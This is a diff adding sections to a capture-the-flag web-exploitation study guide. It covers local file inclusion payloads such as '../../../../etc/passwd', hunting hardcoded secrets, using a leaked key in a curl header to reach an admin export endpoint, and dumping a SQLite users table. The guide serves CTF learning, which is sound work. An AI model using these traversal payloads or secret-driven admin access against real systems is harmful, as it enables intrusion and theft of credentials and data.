@@ -158,4 +158,232 @@ Many challenges hide files in predictable locations.
 
 ### robots.txt
 
-This file tells search engines what not to index — which often reveals hidden directories.
+---
+
+# 6. ATTACKER MINDSET
+
+When you see:
+
+* `?file=`
+* `?layout=`
+* `?template=`
+* `?page=`
+* `/api/`
+* `/admin/`
+* `/export/`
+* `/download/`
+
+Think:
+
+> “Can I make this return something unintended?”
+
+Always test:
+
+* Absolute paths
+* Relative traversal
+* Config files
+* Source code
+
+---
+
+# 7. ENUMERATION CHECKLIST
+
+## 🔍 Parameter Testing
+
+If you see:
+
+```
+/api/fetch_layout?layout=something.html
+```
+
+Test:
+
+```
+/etc/passwd
+../../../../etc/passwd
+/opt/app/app.py
+app.py
+```
+
+Goal:
+
+* Confirm file read
+* Identify app location
+* Identify tech stack
+
+---
+
+## 🔍 Basic LFI Test Payloads
+
+```
+/etc/passwd
+/etc/hosts
+/var/www/html/app.py
+/opt/app/app.py
+../../../../etc/passwd
+```
+
+If output changes → vulnerability confirmed.
+
+---
+
+# 8. LOCAL FILE INCLUSION (LFI)
+
+## 🔥 Definition
+
+Occurs when user-controlled input is used in file operations without validation.
+
+Example vulnerable code:
+
+```python
+file_path = os.path.join(base_dir, layout_file)
+open(file_path)
+```
+
+No sanitization → attacker controls path.
+
+---
+
+## 🔥 Indicators of LFI
+
+* File contents displayed in response
+* Error messages revealing file paths
+* No strict extension validation
+
+---
+
+## 🛡 Common Developer Mistakes
+
+* Using `os.path.join()` without checking traversal
+* Blacklist filtering instead of whitelist
+* Not validating filename against allowed list
+
+---
+
+# 9. SOURCE CODE REVIEW CHECKLIST
+
+Once you get source code:
+
+Search for:
+
+```
+API_KEY
+SECRET
+TOKEN
+PASSWORD
+DB
+admin
+export
+debug
+```
+
+In Python apps:
+
+Look for:
+
+```python
+ADMIN_API_KEY =
+app.secret_key =
+DATABASE =
+```
+
+---
+
+# 10. SECRET DISCOVERY SECTION
+
+## 🔥 Hardcoded Secrets
+
+If you find:
+
+```python
+ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
+```
+
+Ask:
+
+* Where is this used?
+* Is there an admin endpoint?
+* Is it checked in headers?
+
+---
+
+## 🔥 Header-Based Authentication
+
+Look for:
+
+```python
+request.headers.get()
+```
+
+Exploit with:
+
+```
+curl -H "Header-Name: value"
+```
+
+Example:
+
+```
+curl /api/admin/export_db -H "X-Valentine-Token: KEY"
+```
+
+---
+
+# 11. PRIVILEGE ESCALATION VIA API
+
+If admin endpoint found:
+
+Test:
+
+```
+GET /api/admin/
+GET /api/admin/export
+GET /api/admin/download
+GET /api/admin/debug
+```
+
+Check:
+
+* Token validation
+* Weak comparison
+* Hardcoded keys
+
+---
+
+# 12. DATABASE ENUMERATION
+
+If DB downloaded:
+
+### SQLite
+
+```
+sqlite3 database.db
+.tables
+.schema users
+select * from users;
+```
+
+Look for:
+
+* admin accounts
+* flags
+* password reuse
+* internal notes
+
+---
+
+# 13. FULL ATTACK FLOW MODEL
+
+Use this mental model:
+
+1. 🔎 Find input parameter
+2. 🔓 Exploit file read
+3. 📂 Retrieve source code
+4. 🔑 Find secrets
+5. 🚪 Access hidden endpoint
+6. 💾 Dump database
+7. 🚩 Extract flag
+
+This pattern appears VERY often in CTFs.
+
+---
